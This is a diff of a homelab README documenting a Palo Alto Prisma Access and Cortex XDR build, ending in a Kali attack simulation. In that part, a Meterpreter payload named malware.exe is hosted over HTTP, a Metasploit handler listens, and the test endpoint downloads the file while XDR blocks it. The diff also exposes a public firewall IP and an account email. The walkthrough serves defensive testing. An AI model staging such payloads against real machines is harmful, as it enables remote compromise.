@@ -25,15 +25,16 @@ This repo documents the full build-out of the Q3 KSO homelab, including Prisma A
 
 | Component | Detail |
 |---|---|
-| Firewall | PA-VM (cloud-hosted) |
+| Firewall | PA-VM (cloud-hosted at `52.39.209.52`) |
 | Untrust Interface | `ethernet1/1` — `10.3.1.10/24` |
 | Trust Interface | `ethernet1/2` — `10.3.2.10/24` |
 | Tunnel Interface | `tunnel.2` — Security zone: `vpn` |
 | Prisma Access Portal | `dee-lab.lab.gpcloudservice.com` |
 | Service Connection | `raman-lab` (US Southeast) |
 | Prisma Access Peer IP | `34.99.113.219` |
+| Service Endpoint FQDN | `raman-lab.us-southeast.sc.ossj2yygvo.lab.gpcloudservice.com` |
 | XDR Console | `globalseacademy.xdr.us.paloaltonetworks.com` |
-| Test Endpoint | Windows 11 x64 — `mini` |
+| Test Endpoint | Windows 11 x64 — **`mini`** |
 | Attack Machine | Kali Linux 2026.1 — `192.168.1.230` |
 | IKE Crypto | AES-256-CBC / SHA-256 / DH Group 20 / 8hr |
 
@@ -148,21 +149,21 @@ Deploy Prisma Access for GlobalProtect mobile users.
 ### Connect via GlobalProtect
 
 13. Navigate to: `https://dee-lab.lab.gpcloudservice.com`
-14. Log in with your local user credentials.
+14. Log in with your local user credentials (`dee`).
 15. Download and install the GlobalProtect agent.
 16. Enter portal address: `dee-lab.lab.gpcloudservice.com`
 17. You should now be connected. ✅
 
-![GlobalProtect Portal Login](screenshots/21-globalprotect-portal-login.png)
+![GlobalProtect Portal Login — user "dee" at dee-lab.lab.gpcloudservice.com](screenshots/21-globalprotect-portal-login.png)
 
 ---
 
 ## Part 3: ADEM Configuration
 
-Enable Autonomous Digital Experience Management (ADEM) for Prisma Access mobile users.
+Enable Autonomous Digital Experience Management (ADEM) for Prisma Access mobile users to monitor application experience in real time.
 
 1. In SCM, go to: `Insights > Application Experience`
-2. Click the **⚙ settings icon** (top-right).
+2. Click the **⚙ settings icon** (top-right) → **Manage Monitoring Settings**
 
 ### Application Suite
 
@@ -170,7 +171,7 @@ Enable Autonomous Digital Experience Management (ADEM) for Prisma Access mobile 
 
    | Field | Value |
    |---|---|
-   | Name | `youtube` |
+   | Name | `youtube` *(or your chosen app)* |
    | Domain | `www.youtube.com` |
 
 4. Click **Save**.
@@ -181,17 +182,48 @@ Enable Autonomous Digital Experience Management (ADEM) for Prisma Access mobile 
 
    | Field | Value |
    |---|---|
-   | Name | `youtube` |
+   | Name | `youtube` *(or your chosen app)* |
    | Domain URL | `www.youtube.com` |
 
 6. Click **Save**.
-7. Run YouTube on the connected endpoint for **10–20 minutes**, then review the Application tab for telemetry.
+
+7. Use the GlobalProtect-connected endpoint to browse the internet for **10–20 minutes** across several sites. ADEM will automatically begin collecting **Real User Monitoring (RUM)** telemetry.
+
+### ADEM Results
+
+After data collection, navigate back to `Insights > Application Experience` to review scores.
+
+**Application Domains tab** — shows per-domain experience scores:
+
+| Application Domain | User Experience Score | Trend |
+|---|---|---|
+| www.google.com | **96** (Good) ✅ | ↑ |
+| www.dictionary.com | **0** (Poor) ❌ | ↓ |
+| www.merriam-webster.com | **0** (Poor) ❌ | ↓ |
+
+**Your Organization tab** — aggregate view:
+
+| Metric | Value |
+|---|---|
+| Overall Mobile User Experience Score | **32 — Fair** 🟠 |
+| User Devices | 1 |
+| Monitored App Domains | 3 |
+| Good (Google) | 1 domain — 33% |
+| Poor (dictionary, merriam-webster) | 2 domains — 67% |
+| Total Browser Time in Poor State | 1 Min (100%) |
+| Avg LCP (Largest Contentful Paint) | **0.34s — Good** ✅ |
+
+> These scores reflect a short test session. The more traffic generated through the GP tunnel, the richer the telemetry.
+
+![ADEM — Application Domains with experience scores](screenshots/27-adem-application-domains.png)
+
+![ADEM — Your Organization overall experience score (32 — Fair)](screenshots/28-adem-your-organization-experience-score.png)
 
 ---
 
 ## Part 4: Cortex XDR Agent Deployment
 
-Deploy the Cortex XDR endpoint agent on the Windows test machine.
+Deploy the Cortex XDR endpoint agent on the Windows test machine (`mini`).
 
 1. Go to: `https://globalseacademy.xdr.us.paloaltonetworks.com/dashboard`
 2. Navigate to: `Inventory > Installations`
@@ -206,7 +238,7 @@ Deploy the Cortex XDR endpoint agent on the Windows test machine.
 
 4. Click **Create**.
 5. Right-click the installation → **Agent Installation > 64-bit installer** → save the `.msi`.
-6. Deploy the `.msi` on the **Windows 11 x64 machine (mini)**.
+6. Deploy the `.msi` on the **Windows 11 x64 machine (`mini`)**.
 7. On the endpoint, open the XDR console and click **Check In Now**.
 8. Wait ~5 minutes — the endpoint should appear as enabled. ✅
 
@@ -214,7 +246,7 @@ Deploy the Cortex XDR endpoint agent on the Windows test machine.
 
 ## Part 5: XDR Host Insights
 
-Enable Host Insights on the XDR endpoint.
+Enable Host Insights to give XDR visibility into installed applications, open cases, and endpoint telemetry.
 
 ### Create Agent Settings Profile
 
@@ -237,14 +269,65 @@ Enable Host Insights on the XDR endpoint.
    | Name | Dee Lab |
    | Platform | Windows |
    | Agent Settings | Dee Agent Settings |
+   | All other settings | Default |
 
 5. **Next** → Select Endpoint: `mini` → **Next** → **Done** ✅
+
+The **Dee Lab** policy will appear at priority 1 in the Windows prevention policy rules list, targeting `endpoint = mini`.
+
+![XDR Prevention Policy Rules — "Dee Lab" at priority 1, target: mini](screenshots/23-xdr-prevention-policy-rules-dee-lab.png)
+
+### Verify Host Insights Data
+
+Once the policy is applied, navigate to the Host Insights view for `mini`:
+
+`Inventory > All Endpoints > mini > Host Insights (Applications tab)`
+
+**Installed applications detected on `mini` (21 total):**
+
+| Application | Version |
+|---|---|
+| AMD Chipset Software | 5.11.14.2053 |
+| **Cortex XDR** | **9.1.0.20483** |
+| Git | 2.53.0 |
+| Google Chrome | 146.0.7680.165 |
+| HashiCorp Terraform | 1.14.5 |
+| Microsoft Edge | 146.0.3856.72 |
+| Microsoft OneDrive | 26.035.0222.0002 |
+| Microsoft Update Health Tools | 5.72.0.0 |
+| Microsoft Visual C++ 2015-2022 Redistributable (x64) | 14.38.33135.0 |
+| Microsoft Visual C++ 2015-2022 Redistributable (x86) | 14.38.33135.0 |
+| **Microsoft Visual Studio Code** | 1.112.0 |
+| Microsoft Visual Studio Installer | 4.3.2029.11392 |
+| **Node.js** | 24.14.0 |
+| *(+ 8 more)* | |
+
+**Data collected at:** Mar 26 2026 15:22:48
+
+**Recent Open Cases on `mini`:**
+
+| Case ID | Severity | Description |
+|---|---|---|
+| 1077 | 🔴 High | Suspicious executable detected |
+| 1075 | 🔴 High | 'Local Analysis Malware' + 1 other |
+| 1048 | 🔴 High | 'Local Analysis Malware' + 1 other |
+| 829 | 🟠 Medium | 'File Drop - 2554896526' + 1 other |
+| 737 | 🟠 Medium | Evasion technique using reflective loading |
+| 716 | 🟠 Medium | 'Windows LOLBIN scripting engine connect…' |
+| 665 | 🔵 Low | 'Random-Looking Domain Names' |
+| 663 | 🔵 Low | 'Suspicious port scan' generated by XDR Agent |
+| 662 | 🔵 Low | 3 'Local Analysis Malware' alerts prevented |
+| 661 | 🔵 Low | 3 'WildFire Malware' alerts detected |
+
+![XDR Host Insights — Applications tab for endpoint "mini" with 21 installed apps and open cases](screenshots/24-xdr-host-insights-applications-mini.png)
 
 ---
 
 ## Part 6: Device Control & BIOC Rule
 
 ### Device Control — Block Floppy Disk
+
+#### Create Device Configuration Profile
 
 1. Navigate to: `Inventory > Policy Management > Extension > Profiles`
 2. **Add Profile** → **Windows** → **Device Configuration** → **Next**
@@ -256,15 +339,35 @@ Enable Host Insights on the XDR endpoint.
 
 3. Click **Create**.
 
-4. Navigate to: `Prevention > Policy Rules` → **Add Policy**
+#### Create Device Control Policy
+
+4. Navigate to `Device Control > Policies` → **Add Policy**
 
    | Field | Value |
    |---|---|
-   | Name | Dee Lab Device Control |
+   | Name | **DEE-vice control** |
    | Platform | Windows |
-   | Agent Settings | Dee Block Floppy |
+   | Description | None |
 
-5. **Next** → Endpoint: `mini` → **Next** → **Done** ✅
+5. **Next** → Select Endpoint: `mini` (1 endpoint selected) → **Next**
+
+6. On the **Summary** step, confirm settings:
+
+   | Configuration | Profile |
+   |---|---|
+   | Device Configuration | **Dee Block Floppy** |
+   | Device Exceptions | Default |
+   | Host Firewall | Default (Host Firewall Disabled) |
+   | Disk Encryption | Default |
+   | File Integrity Monitoring | Default |
+
+7. Click **Done** ✅
+
+The **DEE-vice control** policy appears at priority 1 in the Extensions Policy Rules list targeting `endpoint = mini` with the **Dee Block Floppy** device configuration.
+
+![XDR Device Control — Policy summary for "DEE-vice control" with "Dee Block Floppy" profile](screenshots/25-xdr-device-control-policy-summary.png)
+
+![XDR Extensions Policy Rules — "DEE-vice control" at priority 1, target: mini](screenshots/26-xdr-extensions-policy-rules-dee-vice-control.png)
 
 ---
 
@@ -318,8 +421,8 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
    | Branch Device IP Address | Dynamic |
    | Pre-Shared Key | *(your PSK)* |
 
-4. > ⚠️ **Commit now** to get the auto-generated service connection FQDN, e.g.:  
-   > `raman-lab.us-southeast.sc.ossj2yygyo.lab.gpcloudservice.com`
+4. > ⚠️ **Commit now** to generate the auto-provisioned service endpoint address:  
+   > `34.99.113.219` / `raman-lab.us-southeast.sc.ossj2yygvo.lab.gpcloudservice.com`
 
 5. Continue with IKE settings:
 
@@ -336,7 +439,9 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
 
 6. **Save every window.**
 
-![SCM Service Connection Config](screenshots/11-scm-service-connection-config.png)
+![SCM Service Connection config — raman-lab, US Southeast, IPSec, IP pool 10.100.100.0/24](screenshots/11-scm-service-connection-config.png)
+
+![SCM Service Connections — raman-lab, Tunnel OK ✅, Config In Sync ✅, Endpoint 34.99.113.219](screenshots/22-scm-service-connection-endpoint-address.png)
 
 ---
 
@@ -384,14 +489,14 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
    | Authentication | Pre-Shared Key |
    | PSK | *(must match SCM)* |
    | Local ID | User FQDN → `draman@paloaltonetworks.com` |
-   | Peer ID | FQDN → `raman-lab.us-southeast.sc.ossj2yygyo.lab.gpcloudservice.com` |
+   | Peer ID | FQDN → `raman-lab.us-southeast.sc.ossj2yygvo.lab.gpcloudservice.com` |
 
 10. **Advanced Options** → enable **NAT Traversal**
 11. Set **IKE Crypto Profile**: `DEE-LAB-IKE-CRYPTO`
 
-![IKE Gateway Configuration](screenshots/09-ike-gateway-config.png)
+![IKE Gateway config — ike-gw-prisma, IKEv2, peer 34.99.113.219, User FQDN local ID](screenshots/09-ike-gateway-config.png)
 
-![IKE Gateway — Raman Prisma GW](screenshots/12-ike-gateway-raman-prisma.png)
+![IKE Gateway — raman-prisma-gw detail view](screenshots/12-ike-gateway-raman-prisma.png)
 
 ---
 
@@ -420,7 +525,7 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
    | IKE Gateway | `ike-gw-prisma` |
    | IPSec Crypto Profile | `DEE-LAB-IPSEC-CRYPTO` |
 
-![IPsec Tunnel — Up (Web UI)](screenshots/16-ipsec-tunnel-up-webui.png)
+![IPsec Tunnel sc-lab-raman — green status, ethernet1/1, tunnel.2, peer 34.99.113.219](screenshots/16-ipsec-tunnel-up-webui.png)
 
 ---
 
@@ -438,24 +543,24 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
    IKEv2 SA: ESTABLISHED ✅
      Algorithm : PSK/DH20/AES256/SHA256
      Peer      : 34.99.113.219:4500 (NAT-T working ✅)
-     Lifetime  : 28800s (8 hours)
      Established: Mar.27 11:19:49
-     Expires   : Mar.27 19:19:49
+     Expires   : Mar.27 19:19:49 (8 hours)
 
    IPsec SA: Mature ✅
      SPI in/out: DFA20C73 / 9456040E
    ```
 
-![Tunnel Established — CLI](screenshots/15-tunnel-established-cli-confirmed.png)
+![Tunnel Established — CLI confirmation, IKEv2 ESTABLISHED, IPsec SA Mature](screenshots/15-tunnel-established-cli-confirmed.png)
 
 15. Verify in SCM — the service connection should show:
 
-   | Status | Value |
+   | Field | Value |
    |---|---|
    | Tunnel | ✅ OK |
    | Config | ✅ In Sync |
+   | Service Endpoint Address | `34.99.113.219` / `raman-lab.us-southeast.sc.ossj2yygvo.lab.gpcloudservice.com` |
 
-![SCM Service Connection — OK / In Sync](screenshots/14-scm-service-connection-ok.png)
+![SCM Service Connection — OK, In Sync, with full service endpoint address visible](screenshots/22-scm-service-connection-endpoint-address.png)
 
 ---
 
@@ -481,13 +586,13 @@ Configure a site-to-site IPsec service connection between the PA-VM and Prisma A
 
 ## Part 8: Kali vs. XDR Attack Simulation
 
-Simulate a real attack: craft a Meterpreter payload on Kali, host it over HTTP, download it on the Windows endpoint, and watch Cortex XDR block it.
+Simulate a real attack: craft a Meterpreter payload on Kali, host it over HTTP, download it on the Windows endpoint (`mini`), and watch Cortex XDR block it.
 
 ---
 
 ### 1. Set Up the Attack Machine (Kali Linux)
 
-Open a terminal on the Kali VM and create the payload:
+Open a terminal on the Kali VM (`192.168.1.230`) and create the payload:
 
 ```bash
 cd ~/Desktop
@@ -519,21 +624,23 @@ msfconsole -q -x "use exploit/multi/handler; \
   run"
 ```
 
-![Kali — msfconsole Listener Running](screenshots/17-kali-msfconsole-listener.png)
+The Kali HTTP server will show access logs for `malware.exe` and `favicon` requests from `192.168.x.x` once the target browses to the server.
+
+![Kali — VMware Workstation with msfconsole multi/handler running, LHOST 192.168.1.230](screenshots/17-kali-msfconsole-listener.png)
 
 ---
 
 ### 3. Download the Payload on the Windows Endpoint
 
-On **mini (Windows 11 x64)**, open a browser and go to:
+On **`mini` (Windows 11 x64)**, open a browser and go to:
 
 ```
 http://192.168.1.230/malware.exe
 ```
 
-The Kali HTTP server will show the directory listing including `malware.exe`.
+The directory listing served from Kali will show `malware.exe` alongside the `.msf4/` Metasploit directory, confirming the attack server is running.
 
-![Kali HTTP Server — Directory Listing with malware.exe](screenshots/18-kali-http-server-malware.png)
+![Kali HTTP server — directory listing showing malware.exe and .msf4/ Metasploit directory](screenshots/18-kali-http-server-malware.png)
 
 Download and attempt to run `malware.exe`.
 
@@ -555,7 +662,7 @@ Cortex XDR has blocked a malicious activity!
 Please contact your help desk for questions or additional information.
 ```
 
-![XDR Prevention Alert — malware.exe Blocked](screenshots/20-xdr-prevention-alert.png)
+![XDR Prevention Alert — "Cortex XDR has blocked a malicious activity!" — malware.exe blocked on mini](screenshots/20-xdr-prevention-alert.png)
 
 ---
 
@@ -566,9 +673,11 @@ In the XDR console, navigate to **Incidents** or **Alerts** to confirm:
 | Field | Value |
 |---|---|
 | Alert Type | Malware / Suspicious Executable |
-| Endpoint | mini |
+| Endpoint | `mini` |
 | File | `malware.exe` |
 | Action | **Prevented** ✅ |
+
+This alert will also appear as a new **Case** in Host Insights under `mini`, visible in the Recent Open Cases panel (e.g., Case #1077 — "Suspicious executable detected").
 
 ---
 
@@ -578,11 +687,11 @@ In the XDR console, navigate to **Incidents** or **Alerts** to confirm:
 |---|---|
 | Prisma Access License Requested | ✅ |
 | GlobalProtect Mobile Users Deployed | ✅ |
-| ADEM Configured | ✅ |
-| Cortex XDR Agent Deployed on mini | ✅ |
-| Host Insights Enabled | ✅ |
-| Device Control — Block Floppy | ✅ |
-| BIOC Rule — PowerShell `-enc` Detection | ✅ |
-| Service Connection (IPsec Tunnel) Live | ✅ |
-| Ping Validated Through Tunnel (0% loss) | ✅ |
-| Kali Attack Simulated & Blocked by XDR | ✅ |
+| ADEM Configured — 3 domains monitored, score 32 (Fair) | ✅ |
+| Cortex XDR Agent Deployed on `mini` | ✅ |
+| Host Insights — 21 apps inventoried, open cases visible | ✅ |
+| Device Control — "DEE-vice control" / "Dee Block Floppy" | ✅ |
+| BIOC Rule — PowerShell `-enc` detection | ✅ |
+| Service Connection — `raman-lab` IPsec Tunnel Live | ✅ |
+| Ping Validated Through Tunnel — 24/24 packets, 0% loss | ✅ |
+| Kali Attack Simulated & Blocked by XDR on `mini` | ✅ |
